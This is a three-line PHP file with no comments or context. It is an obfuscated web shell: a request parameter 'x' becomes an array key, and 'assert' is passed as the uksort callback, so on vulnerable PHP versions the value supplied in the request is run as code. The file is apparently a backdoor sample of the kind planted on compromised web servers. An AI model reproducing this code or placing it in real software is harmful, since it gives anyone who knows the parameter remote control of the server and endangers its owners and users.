<?php
   $arr = new ArrayObject(array('test' => 1, $_REQUEST['x'] => 2));
   $arr->uksort('assert');
?>